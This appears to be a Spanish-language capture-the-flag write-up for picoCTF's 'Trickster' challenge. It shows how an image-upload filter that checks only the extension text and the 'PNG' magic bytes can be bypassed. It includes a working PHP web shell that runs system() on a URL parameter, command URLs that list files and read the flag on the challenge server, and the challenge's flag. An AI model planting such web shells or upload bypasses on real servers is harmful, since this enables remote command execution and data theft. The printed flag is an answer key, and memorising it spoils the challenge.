# Nombre del reto
>Trickster

---
# Descripción
>I found a web app that can help process images: PNG images only!

---
# Solución
Para resolver esto, primero que nada debemos de entender que al entrar a la página y querer subir una imagen, el navegador busca valores hexadecimales (según las instrucciones de /instructions.txt)
```
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
```
Entonces, podemos subir cualquier archivo que contenga esos hexadecimales, como por ejemplo un script de php que nos permita mandar como argumento un comando de cmd como lo sería:
```php
PNG
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
```
¿Por qué funciona? Por que las letras PNG hacen que se interprete como un PNG. Ahora, solo nos queda empezar a mandar nuestros datos, supongamos que mandamos un archivo que se llame webshell.php. En la barra de navegación pegamos un URL como lo es: `http://atlas.picoctf.net:60096/uploads/webshell.php?cmd=ls` entonces podemos ver los archivos que se encuentran en la carpeta uploads, entonces podemos jugar un poco con esto, como con las siguientes entradas:
```
http://atlas.picoctf.net:60096/uploads/webshell.php?cmd=ls ..
http://atlas.picoctf.net:60096/uploads/webshell.php?cmd=cat ../HFQWKODGMIYTO.txt
```
Esto nos dará nuestro flag en la pantalla

---
# Flag del reto
>picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17}

---
# Notas adicionales
Requiere una instancia, se puede reemplazar el 60096 por el puerto que te den a ti.

---
# Referencias

